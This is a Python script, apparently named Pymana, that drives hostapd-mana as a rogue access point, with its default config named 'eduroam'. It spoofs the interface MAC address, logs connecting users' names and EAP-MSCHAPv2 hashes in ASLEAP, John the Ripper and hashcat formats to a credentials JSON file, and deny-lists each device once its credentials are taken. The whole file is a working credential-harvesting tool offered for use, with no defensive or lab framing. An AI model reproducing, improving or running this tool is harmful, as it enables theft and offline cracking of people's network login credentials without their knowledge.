import os
import sys
import subprocess

import time
import json

import mmap
import random

g_iface = "wlan0"
g_creds_file_name = "credentials"
g_config_file_name = "eduroam"
g_creds_file = None
g_creds_dict = {}

#def pymana_reload():
    #sudo kill -SIGHUP $(pidof hostapd-mana)
    #process = subprocess.Popen("sudo kill -HUP $(pidof hostapd-mana)", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
    #process = subprocess.Popen("sudo ./hostapd-mana/hostapd/hostapd_cli set deny_mac_file hostapd.deny", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
    #print("Pymana: Reloaded \"deny_mac_file\"")

def pymana_exec_cmd(cmd, cmd_msg, cmd_err):
    print(f"Pymana: {cmd_msg}")

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
        
        # wait process to complete and capture output
        output, error = process.communicate()
        print(output)

        # print any error
        if error:
            print(error)
    except Exception as e:
        print(f"(ERROR) Pymana {cmd_err}: {e}")

def pymana_main(cmd):
    global g_iface, g_creds_file, g_creds_dict

    try:
        # print command being executed
        print("=========================================================")
        print("Pymana v0.2")
        print(f"\nExecuting command:\n\"{cmd}\"")
        print("=========================================================\n")

        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)

        # start of hostapd-mana loop
        while True:
            output = process.stdout.readline()
            output_arr = output.strip().split()

            # check for program termination
            if process.poll() is not None:
                break

            # check for valid ouput
            if output == '' or len(output_arr) == 0:
                continue

            # print output
            if output:
                # exit the program in case handle_proble_req fail occurs
                if 'handle_probe_req: send failed' in output:
                    raise KeyboardInterrupt
                
                #if (len(output_arr) < 8 and output_arr[0] != "wlan0:") or (len(output_arr) > 7 and output_arr[6] != "ACL:"):
                if output_arr[0] != f"{g_iface}:" and ("ACL:" not in output) and ("handle_auth_cb:" not in output) and ("not allowed to authenticate" not in output):   # do not print unwanted lines
                    print(output.strip())

            # register usernames
            if output_arr[0] == "MANA" and output_arr[3] == "Phase" and output_arr[4] == "0:":
                if output_arr[5] not in g_creds_dict:
                    g_creds_dict[output_arr[5]] = []    # add username entry to credentials

                    g_creds_file.seek(0)  # rewind
                    json.dump(g_creds_dict, g_creds_file, indent=4)
                    g_creds_file.truncate()

            # register hashed passwords
            elif output_arr[0] == "MANA" and output_arr[2] == "EAP-MSCHAPV2":
                username = ""
                if output_arr[3] == "ASLEAP":   # ASLEAP
                    username = output_arr[4].split("=")[1]
                else:   # JTR, HASHCAT
                    username = output_arr[5].split(":")[0]

                if username not in g_creds_dict:
                    g_creds_dict[username] = []
                elif len(g_creds_dict[username]) > 2:
                    g_creds_dict[username].clear()

                g_creds_dict[username].append(" ".join(output_arr[3:]))

                g_creds_file.seek(0)  # rewind
                json.dump(g_creds_dict, g_creds_file, indent=4)
                g_creds_file.truncate()

                if len(g_creds_dict[username]) == 3:
                    if sys.getsizeof(g_creds_dict) > 1048576:    # 1MB
                        g_creds_dict.clear()

            # add MAC address to deny list after CREDENTIALS CAPTURE or after INVALID CERTIFICATE
            elif (len(output_arr) > 10 and output_arr[5] == "deauthenticated") or (len(output_arr) == 3 and output_arr[1] == "CTRL-EVENT-EAP-FAILURE"):
                with open("hostapd.deny", "a+") as deny_file:
                    if os.stat("hostapd.deny").st_size == 0 or mmap.mmap(deny_file.fileno(), 0, access=mmap.ACCESS_READ).find(output_arr[2].encode('utf-8')) == -1:
                        deny_file.write(f"{output_arr[2]}\n")

                        print(f"Pymana: Added {output_arr[2]} MAC address to deny list")
                        
                # reload hostapd-mana deny_mac_file
                #pymana_exec_cmd("sudo ./hostapd-mana/hostapd/hostapd_cli set deny_mac_file hostapd.deny", "Reloading \"deny_mac_file\"...", "reload")
                pymana_exec_cmd("kill -1 $(pidof hostapd)", "Reloading configs...", "reload")

            """
            # allow only one association attempt per device
            if len(output_arr) > 10 and output_arr[5] == "deauthenticated":
                # check if STA entered "deauthenticated" state
                #if output_arr[5] == "deauthenticated":

                # add device MAC address to deny list to prevent further connections
                with open("hostapd.deny", "a") as deny_file:
                    deny_file.write(f"{output_arr[2]}\n")

                print(f"Pymana: Added {output_arr[2]} MAC address to deny list")

                pymana_reload() # reload pymana
            """

        # end of hostapd-mana loop
        
        process.wait()

        # get the return code of the command
        return_code = process.returncode
        print(f"Command completed with return code: {return_code}")

    except KeyboardInterrupt:
        print("\nKeyboardInterrupt: Ending script")
        process.terminate()
        process.wait()
        
        print("Pymana: Terminated")
        return
    
def edit_config_file():
    global g_iface, g_config_file_name

    try:
        with open(g_config_file_name, "r+") as config_file:
            file_contents = config_file.read()

            # add interface attribution in case the config file doesn't have it
            if 'interface' not in file_contents:
                config_file.write(f"\ninterface={g_iface}")
                return True

            config_file.seek(0) # reset file pointer
            
            for line in config_file.readlines():
                line = line.strip()

                if '#' in line or len(line) == 0: # ignore lines with '#' comments
                    continue

                arg, attr = line.split('=')
                if arg == 'interface':
                    config_file.seek(0) # reset file pointer
                    config_file.write(file_contents.replace(f"{arg}={attr}", f"{arg}={g_iface}"))
                    config_file.truncate()  # truncate any remaining content

    except FileNotFoundError:
        print(f"(ERROR) Pymana: Config file '{g_config_file_name}' not found")
        return False
    
    return True

def parse_arguments():
    global g_iface, g_creds_file_name, g_config_file_name

    print("Pymana: Parsing arguments...\n")

    cur_arg = ''
    for a in sys.argv:
        # reading argument
        if len(a) > 2 and a[0:2] == '--':
            #print(f"Reading argument '{a[2:]}'")
            cur_arg = a[2:]
        # reading attribute
        elif cur_arg != '' and a[0:2] != '--':
            #print(f"Reading attribute '{a}' for argument '{cur_arg}'")
            if cur_arg == 'iface':
                g_iface = a
                print(f"\tiface = {a}")
            elif cur_arg == 'creds':
                g_creds_file_name += f"-{a}"
                print(f"\tcreds = {a}")
            elif cur_arg == 'conf':
                g_config_file_name = a
                print(f"\tconf = {a}")

            cur_arg = ''

    print()

def rand_hex():
    if random.randint(0, 1):
        return chr(random.randint(ord('a'), ord('f')))
    
    return str(random.randint(0, 9))

def main():
    global g_iface, g_creds_file_name, g_config_file_name, g_creds_file, g_creds_dict
    
    parse_arguments()

    g_creds_file_name += ".json"
    g_config_file_name += ".conf"

    # edit config file to ensure the interface is set to the same one as the given argument
    if edit_config_file():

        # change wireless device to unmanaged
        # NOTE: changing wireless device to unmanged, otherwise the device frames block after a while
        #       the unmanaged mode also needs to be set before changing the device mac address otherwise, on the first run, it will not use the new address
        pymana_exec_cmd(f"nmcli dev set {g_iface} managed no", "Setting wireless interface to unmanaged...\n", "unmanaged")

        # change wireless device MAC address
        mac_suf = f"{rand_hex()}{rand_hex()}:{rand_hex()}{rand_hex()}:{rand_hex()}{rand_hex()}"
        pymana_exec_cmd(f"ip link set dev {g_iface} down; ip link set dev {g_iface} address 00:59:dc:{mac_suf}; ip link set dev {g_iface} up", "Changing wireless device MAC address...\n", "chmac")

        # load credentials json file
        try:
            g_creds_file = open(f"{g_creds_file_name}", "r+")
            try:
                g_creds_dict = json.load(g_creds_file)
            # JSONDecodeError error, file can either be empty or not in json format
            except ValueError:
                g_creds_file.seek(0)  # rewind
                json.dump({}, g_creds_file, indent=4)
                g_creds_file.truncate()

            if sys.getsizeof(g_creds_dict) > 1048576:    # 1MB
                g_creds_dict.clear()
        except FileNotFoundError:
            g_creds_file = open(f"{g_creds_file_name}", "w")
            json.dump({}, g_creds_file, indent=4)

        # execute hostapd-mana
        pymana_main(f"./hostapd-mana/hostapd/hostapd {g_config_file_name}")
        #pymana_main(f"hostapd-mana {g_config_file_name}")

# main
if __name__ == "__main__":
    main()